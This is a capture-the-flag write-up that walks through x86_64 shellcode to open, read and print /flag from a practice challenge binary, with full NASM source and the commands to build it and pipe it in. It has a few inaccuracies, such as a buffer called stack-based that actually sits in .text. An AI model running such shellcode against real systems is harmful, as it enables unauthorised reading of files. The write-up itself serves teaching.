# **Binary Exploitation: Basic Shellcode Challenge Write-up**

## **Challenge Overview**
The **basic-shellcode** challenge requires writing and executing position-independent shellcode to read and print the contents of `/flag`. The program allocates memory on the stack, reads shellcode from stdin, and executes it. Key constraints include:

- **Position-independent code (PIC)**: The shellcode must work regardless of where it's loaded in memory.
- **Closed file descriptors**: All file descriptors > 2 are closed, so we must use standard file descriptors (0: stdin, 1: stdout, 2: stderr).
- **No environment variables/arguments**: The shellcode must be self-contained.

---

## **Solution Approach**
The goal is to write shellcode that:
1. **Opens** `/flag` (using the `open` syscall).
2. **Reads** its contents (using the `read` syscall).
3. **Writes** the contents to stdout (using the `write` syscall).
4. **Exits** cleanly (using the `exit` syscall).

### **Step-by-Step Shellcode Breakdown**
#### **1. Open the File (`/flag`)**
- **Syscall:** `open` (syscall number `2` in x86_64).
- **Arguments:**
  - `rdi`: Pointer to the filename (`/flag`).
  - `rsi`: Flags (`0` for `O_RDONLY`).
  - `rdx`: Mode (ignored, set to `0`).

```asm
mov rax, 2          ; sys_open
lea rdi, [rel flag] ; filename (position-independent)
mov rsi, 0          ; O_RDONLY
mov rdx, 0          ; mode
syscall
```

#### **2. Read the File Contents**
- **Syscall:** `read` (syscall number `0`).
- **Arguments:**
  - `rdi`: File descriptor (returned from `open`).
  - `rsi`: Buffer to store data (stack-based).
  - `rdx`: Number of bytes to read (e.g., `100`).

```asm
mov rdi, rax        ; fd from open()
mov rax, 0          ; sys_read
lea rsi, [rel buf]  ; buffer
mov rdx, 100        ; bytes to read
syscall
```

#### **3. Write to Stdout**
- **Syscall:** `write` (syscall number `1`).
- **Arguments:**
  - `rdi`: File descriptor (`1` for stdout).
  - `rsi`: Buffer containing the flag.
  - `rdx`: Number of bytes read (returned from `read`).

```asm
mov rdx, rax        ; bytes read
mov rax, 1          ; sys_write
mov rdi, 1          ; stdout
lea rsi, [rel buf]  ; buffer
syscall
```

#### **4. Exit the Program**
- **Syscall:** `exit` (syscall number `60`).
- **Arguments:**
  - `rdi`: Exit code (`0` for success).

```asm
mov rax, 60         ; sys_exit
mov rdi, 0          ; exit code
syscall
```

#### **Data Section (Filename & Buffer)**
```asm
flag:
    db "/flag", 0   ; null-terminated string
buf:
    times 100 db 0  ; 100-byte buffer
```

---

## **Final Assembly Code**
```asm
section .text
global _start

_start:
    ; Open /flag
    mov rax, 2
    lea rdi, [rel flag]
    mov rsi, 0
    mov rdx, 0
    syscall

    ; Read from file
    mov rdi, rax
    mov rax, 0
    lea rsi, [rel buf]
    mov rdx, 100
    syscall

    ; Write to stdout
    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel buf]
    syscall

    ; Exit
    mov rax, 60
    mov rdi, 0
    syscall

flag:
    db "/flag", 0
buf:
    times 100 db 0
```

---

## **Compilation & Execution**
1. **Assemble the code** into an object file:
   ```bash
   nasm -f elf64 shellcode.asm -o shellcode.o
   ```
2. **Link** to create an executable (for testing):
   ```bash
   ld shellcode.o -o shellcode
   ```
3. **Extract raw shellcode**:
   ```bash
   objcopy --dump-section .text=shellcode.bin shellcode
   ```
4. **Pipe the shellcode** to the challenge:
   ```bash
   cat shellcode.bin | /challenge/binary-exploitation-basic-shellcode
   ```

---

## **Key Takeaways**
1. **Position-Independence**: Use `lea` with `rel` to reference data without hardcoded addresses.
2. **Syscalls in x86_64**:
   - `open` (2), `read` (0), `write` (1), `exit` (60).
   - Arguments passed in `rdi`, `rsi`, `rdx`.
3. **File Handling**:
   - Always check the return value of `open` (file descriptor).
   - Use a buffer to read data before writing it to stdout.
4. **Testing Shellcode**:
   - Test locally before running on the challenge binary.
   - Use `strace` to debug syscalls if needed.

---

## **Conclusion**
This challenge demonstrates fundamental shellcode writing for file operations in Linux. The key was constructing position-independent code that opens, reads, and writes the flag using raw syscalls. This technique is foundational for more advanced binary exploitation, such as **Return-Oriented Programming (ROP)** and **shellcode injection** in exploit development.
